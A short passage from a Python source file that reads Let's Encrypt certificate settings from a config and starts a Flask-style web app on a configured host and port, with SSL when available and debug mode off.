        le_cert_path=ssl_cfg.get("le_cert", ""),
        le_key_path=ssl_cfg.get("le_key", ""),
        use_letsencrypt=ssl_cfg.get("letsencrypt", False),
    )

    if ssl_ctx:
        app.run(host=LISTEN_HOST, port=LISTEN_PORT, ssl_context=ssl_ctx, debug=False)
    else:
        app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False)
